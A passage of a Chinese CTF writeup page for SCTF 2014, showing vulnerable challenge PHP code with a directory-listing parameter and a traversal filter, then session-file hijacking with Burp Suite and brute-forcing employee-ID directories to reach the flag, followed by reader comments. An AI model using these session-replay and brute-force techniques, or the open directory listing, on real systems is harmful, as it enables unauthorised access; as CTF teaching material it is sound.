&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&#39;Content-type:&nbsp;application/x-&#39;.$fileinfo[&#39;extension&#39;]);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;header(&#39;Content-Disposition:&nbsp;attachment;&nbsp;filename=&#39;.$fileinfo[&#39;basename&#39;]);
&nbsp;&nbsp;&nbsp;&nbsp;header(&#39;Content-Length:&nbsp;&#39;.sprintf(&quot;%u&quot;,&nbsp;@filesize($filename)));@readfile($filename);
&nbsp;&nbsp;&nbsp;&nbsp;exit;
&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$errmsg&nbsp;=&nbsp;&#39;Can&nbsp;not&nbsp;find&nbsp;file&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&lt;script&gt;alert(&#39;$errmsg&#39;);window.location=&#39;index.php&#39;;&lt;/script&gt;&quot;;
&nbsp;&nbsp;}
}
elseif(isset($_GET[&#39;d1r&#39;]))&nbsp;{
&nbsp;&nbsp;$files&nbsp;=&nbsp;@scandir($_GET[&#39;d1r&#39;]);
&nbsp;&nbsp;if&nbsp;($files)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$files&nbsp;=&nbsp;array_diff($files,&nbsp;array(&#39;..&#39;,&nbsp;&#39;.&#39;));
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&lt;pre&gt;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;foreach($files&nbsp;as&nbsp;$file)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$file.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\r\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&lt;/pre&gt;&quot;;
&nbsp;&nbsp;}
}&nbsp;else&nbsp;{
&nbsp;&nbsp;header(&quot;Location:&nbsp;../index.php&quot;);
}?&gt;</pre><p><span style="font-family:宋体">可以列目录，但是应该是因为权限原因，只能列</span>tmp<span style="font-family:宋体">目录。</span>Tmp<span style="font-family:宋体">目录下有</span>session<span style="font-family:宋体">文件，可以使用这些</span>session<span style="font-family:宋体">，登陆。</span></p><p><span style="font-family:宋体">如图。</span></p><p style="text-align:center"><img style="width: 600px;height: 212px" alt="t01a6d37794a982550a.png" src="http://p3.qhimg.com/t01a6d37794a982550a.png" title="t01a6d37794a982550a.png" height="212" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">访问</span>index.php<span style="font-family:宋体">的时候带上</span>cookie<span style="font-family:宋体">。</span></p><p><span style="font-family:宋体">将所有</span>session<span style="font-family:宋体">放入</span>burpsuite<span style="font-family: 宋体">跑一遍，发现只有</span></p><p>PHPSESSID=ad5fe3a692726d8c8a1524cac84085c3</p><p><span style="font-family:宋体">时登陆成功。</span></p><p><span style="font-family:宋体">继续审计源码，有一个</span>down.php</p><pre class="brush:php;toolbar:false">&lt;?php
&nbsp;
session_start();
&nbsp;
require_once&nbsp;&#39;syc_include/func.php&#39;;
&nbsp;
&nbsp;
if&nbsp;(!isset($_SESSION[&#39;login_file&#39;])&nbsp;||&nbsp;$_SESSION[&#39;login_file&#39;]&nbsp;!==&nbsp;1)&nbsp;{
&nbsp;
header(&#39;Location:&nbsp;login.php&#39;);
&nbsp;
exit;
&nbsp;
}
&nbsp;
&nbsp;
if&nbsp;(isset($_GET[&#39;file&#39;]))&nbsp;{
&nbsp;
$file&nbsp;=&nbsp;$_GET[&#39;file&#39;];
&nbsp;
//Base
&nbsp;
$file&nbsp;=&nbsp;str_replace(&#39;..&#39;,&nbsp;&#39;&#39;,&nbsp;$file);
&nbsp;
$file&nbsp;=&nbsp;str_replace(&#39;/&#39;,&nbsp;&#39;&#39;,&nbsp;$file);
&nbsp;
$file&nbsp;=&nbsp;str_replace(&#39;\\&#39;,&nbsp;&#39;&#39;,&nbsp;$file);
&nbsp;
&nbsp;
//Win&nbsp;short&nbsp;name
&nbsp;
$file&nbsp;=&nbsp;str_replace(&#39;~&#39;,&nbsp;&#39;&#39;,&nbsp;$file);
&nbsp;
&nbsp;
//ADS
&nbsp;
$file&nbsp;=&nbsp;str_replace(&#39;:&#39;,&nbsp;&#39;&#39;,&nbsp;$file);
&nbsp;
&nbsp;
download($user_cwd.$file);
&nbsp;
}
&nbsp;
?&gt;</pre><p><span style="font-size:12px;font-family:&#39;微软雅黑&#39;,&#39;sans-serif&#39;;color:olive"><span style="background:#FFEDC4"></span></span><br/></p><p><span style="font-family:宋体">应该是用于文件下载的。接着读</span>syc_include/func.php<span style="font-family:宋体">源码，</span></p><p>&nbsp;</p><pre class="brush:php;toolbar:false">&lt;?php
@error_reporting(7);
define(&#39;IS_WIN&#39;,&nbsp;DIRECTORY_SEPARATOR&nbsp;==&nbsp;&#39;\\&#39;);
&nbsp;
$user_cwd&nbsp;=&nbsp;$_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;/file/files/&#39;.$_SESSION[&#39;number&#39;];
foreach&nbsp;(array(&#39;user_cwd&#39;)&nbsp;as&nbsp;$k)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(IS_WIN)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$k&nbsp;=&nbsp;str_replace(&#39;\\&#39;,&nbsp;&#39;/&#39;,&nbsp;$$k);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(substr($$k,&nbsp;-1)&nbsp;!=&nbsp;&#39;/&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$k&nbsp;=&nbsp;$$k.&#39;/&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
&nbsp;
if(!function_exists(&#39;scandir&#39;))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;scandir($cwd)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$files&nbsp;=&nbsp;array();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$dh&nbsp;=&nbsp;opendir($cwd);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;($file&nbsp;=&nbsp;readdir($dh))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$files[]&nbsp;=&nbsp;$file;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$files&nbsp;?&nbsp;$files&nbsp;:&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
&nbsp;
function&nbsp;download($filename)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(is_file($filename)&nbsp;&amp;&amp;&nbsp;is_readable($filename))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@ob_end_clean();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fileinfo&nbsp;=&nbsp;pathinfo($filename);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(function_exists(&#39;mime_content_type&#39;))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$type&nbsp;=&nbsp;@mime_content_type($filename);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-Type:&nbsp;&quot;&nbsp;.&nbsp;$type);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&#39;Content-type:&nbsp;application/x-&#39;&nbsp;.&nbsp;$fileinfo[&#39;extension&#39;]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&#39;Content-Disposition:&nbsp;attachment;&nbsp;filename=&#39;&nbsp;.&nbsp;$fileinfo[&#39;basename&#39;]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&#39;Content-Length:&nbsp;&#39;&nbsp;.&nbsp;sprintf(&quot;%u&quot;,&nbsp;@filesize($filename)));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@readfile($filename);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$errmsg&nbsp;=&nbsp;&#39;Can&nbsp;not&nbsp;find&nbsp;file&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&lt;script&gt;alert(&#39;$errmsg&#39;);window.location=&#39;index.php&#39;;&lt;/script&gt;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
&nbsp;
function&nbsp;getFileList($path){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$user_cwd;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$j=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$files&nbsp;=&nbsp;@scandir($path);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($files)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$files&nbsp;=&nbsp;array_diff($files,&nbsp;array(&#39;..&#39;,&#39;.&#39;));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($files&nbsp;as&nbsp;$file)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$f=str_replace(&#39;//&#39;,&#39;/&#39;,$path.&#39;/&#39;.$file);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$filedata[$j][&#39;filename&#39;]=str_replace($user_cwd,&#39;&#39;,$f);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$filedata[$j][&#39;mtime&#39;]=@date(&#39;Y-m-d&nbsp;H:i:s&#39;,filemtime($f));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$j++;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$filedata;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;array();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
&nbsp;
?&gt;</pre><p><span style="font-family:宋体">发现只能下载</span>/file/files/$_SESSION[&#39;number&#39;]<span style="font-family:宋体">下面的文件（硬编码了），而且</span>file<span style="font-family:宋体">目录不存在，所以这个</span>down.php<span style="font-family:宋体">根本没用。（不知道是主办方刻意为之还是疏忽）</span></p><p><span style="font-family:宋体">但是存在着</span>files<span style="font-family:宋体">目录，而</span>$_SESSION[&#39;number&#39;]<span style="font-family:宋体">可以通过读</span>tmp<span style="font-family:宋体">下面的缓存文件得知。</span></p><p style="text-align:center"><img style="width: 600px;height: 111px" alt="t01e4159b4525902277.png" src="http://p6.qhimg.com/t01e4159b4525902277.png" title="t01e4159b4525902277.png" height="111" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">说明</span>$_SESSION[&#39;number&#39;]<span style="font-family:宋体">存着就是工号</span>SYCXXX</p><p><span style="font-family:宋体">于是继续用</span>burpsuite<span style="font-family:宋体">暴力跑一遍</span>files/sycxxx/torrent <span style="font-family:宋体">所有目录下面的</span>torrent<span style="font-family:宋体">文件。</span></p><p style="text-align:center"><img style="width: 600px;height: 398px" alt="t0103244cd398dcfcae.png" src="http://p7.qhimg.com/t0103244cd398dcfcae.png" title="t0103244cd398dcfcae.png" height="398" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">得到</span>flag<span style="font-family:宋体">：</span>SCTF{FuNny_Pene7ration_Test}</p><p>&nbsp;</p><p>PS:<span style="font-family:宋体">本题是赛后做出来的，答题时并没有做出来。（我能说最后槽点太高了么？你们不知道机智赛棍会啥也不管，不审计，不分析，直接暴力跑</span>SYCXXX<span style="font-family:宋体">么！！！）</span></p><p>&nbsp;</p><p>&nbsp;*******分割线*********以下内容转载自PaxMac的博客，链接http://ctf.paxmac.org/sctf-writeup-by-pax-mac-team/*****************</p><p>&nbsp;<span style="font-family: Wingdings;">l<span style="font-size: 9px; font-family: &#39;Times New Roman&#39;;">&nbsp;&nbsp;</span></span><strong style="white-space: normal;">Code400</strong></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 14px"><br/><img src="http://p4.qhimg.com/t01eebc1fbc28dbe1a4.png" title="t01eebc1fbc28dbe1a4.png" alt="t01eebc1fbc28dbe1a4.png" width="600" height="389" border="0" vspace="0" style="width: 600px; height: 389px;"/></span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 14px"><img src="http://p8.qhimg.com/t01097509cc9b6e15c9.png" title="t01097509cc9b6e15c9.png" alt="t01097509cc9b6e15c9.png" width="600" height="928" border="0" vspace="0" style="width: 600px; height: 928px;"/></span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 14px"><img src="http://p6.qhimg.com/t01ec435ca2a7392924.png" title="t01ec435ca2a7392924.png" alt="http://p4.qhimg.com/t01ec435ca2a7392924.png"/></span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 14px"><img src="http://p7.qhimg.com/t01f33cff9df42b5e61.png" title="t01f33cff9df42b5e61.png" alt="t01f33cff9df42b5e61.png" width="600" height="728" border="0" vspace="0" style="width: 600px; height: 728px;"/></span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 14px"><img src="http://p0.qhimg.com/t01dc797bdad4f2a5b4.png" title="t01dc797bdad4f2a5b4.png" alt="t01dc797bdad4f2a5b4.png" width="600" height="818" border="0" vspace="0" style="width: 600px; height: 818px;"/></span></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">&nbsp;<span style="font-family: Wingdings;">l<span style="font-size: 9px; font-family: &#39;Times New Roman&#39;;">&nbsp;&nbsp;</span></span><strong style="white-space: normal;">Misc100</strong><strong style="white-space: normal;"></strong></span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 14px"><strong style="white-space: normal;"><img src="http://p8.qhimg.com/t01a21871571e73b822.png" title="t01a21871571e73b822.png" alt="t01a21871571e73b822.png" width="600" height="359" border="0" vspace="0" style="width: 600px; height: 359px;"/></strong></span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 14px"><strong style="white-space: normal;"><img src="http://p4.qhimg.com/t01255680c327c2c7b6.png" title="t01255680c327c2c7b6.png" alt="t01255680c327c2c7b6.png" width="600" height="666" border="0" vspace="0" style="width: 600px; height: 666px;"/></strong></span></p><p><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/129.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【全网首发】SCTF 完美通过攻略（Writeup ） - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="129" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/2x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="274" user-name="草泥马" href="javascript:;">
                草泥马            </a>
                        <span class="comment-time">2014-12-14 22:14:44</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="274">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_274" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">这个贪吃蛇的解题人明显作假，根本就没写明白，看过神人写的writeup，一种是给程序发signal，一种是直接修改二进制，将处理消息的模块写完整，这里的贪吃蛇题解是真的解决了？</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t0178a8efadd8c225a1.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="82955060" class="response" data-bind-id="82955060" data-target="248" user-name="t潇水" href="javascript:;">
                t潇水            </a>
                        <span class="comment-time">2014-12-10 21:16:07</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="82955060" data-target="248">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_248" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">misc中foremost  是什么东西，怎么在hex中怎么看有zip包</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t01db5feb289b86453f.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="108508051" class="response" data-bind-id="108508051" data-target="219" user-name="枯等街寒" href="javascript:;">
                枯等街寒            </a>
                        <span class="comment-time">2014-12-09 19:02:07</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="108508051" data-target="219">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_219" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">10分路过。。。。</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t014837342cb403ec82.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="899975245" class="response" data-bind-id="899975245" data-target="218" user-name="360U899975245" href="javascript:;">
                360U899975245            </a>
                        <span class="comment-time">2014-12-09 18:46:42</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="899975245" data-target="218">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_218" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">Code200中的代码和题目有什么关系，没看懂，帮忙解释一下？</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t01e6e5b29659ba0c56.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="993254015" class="response" data-bind-id="993254015" data-target="217" user-name="迦南0x1" href="javascript:;">
                迦南0x1            </a>
                        <span class="comment-time">2014-12-09 17:29:34</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="993254015" data-target="217">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_217" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">蛋蛋的忧伤</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t00df551a583a87f4e9.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="1305806462" class="response" data-bind-id="1305806462" data-target="214" user-name="360U1305806462" href="javascript:;">
                360U1305806462            </a>
                        <span class="comment-time">2014-12-09 15:22:18</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="1305806462" data-target="214">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_214" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">PT500确实坑很多……</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t03ebd77aa17ce4fc5d.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="279032883" class="response" data-bind-id="279032883" data-target="211" user-name="yuan_baobao" href="javascript:;">
                yuan_baobao            </a>
                        <span class="comment-time">2014-12-09 13:18:14</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="279032883" data-target="211">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_211" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">这次的web题挺难过的。。。需要极强的脑洞。。。源姐也是泪流满面。。。</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
